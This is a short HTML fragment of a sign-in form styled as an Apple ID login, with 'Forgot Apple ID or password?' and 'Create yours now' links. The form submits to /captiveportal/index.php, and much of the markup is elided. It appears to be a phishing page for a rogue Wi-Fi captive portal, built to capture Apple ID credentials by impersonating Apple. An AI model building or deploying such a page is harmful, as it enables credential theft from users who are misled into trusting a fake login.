...
<body>
    ...
    <div class="main">
        <form action="/captiveportal/index.php" method="POST">
            <div id="sign">
                <h2>Sign in</h2>
            ...
            <div class="input2">
                ...
                <label for="remember" id="r2">Remember me</label>
            </div>
            <h4><a href="#">Forgot Apple ID or password?</a></h4>
            <h4>Don't have an Apple ID? <a href="#">Create yours now.</a></h4>
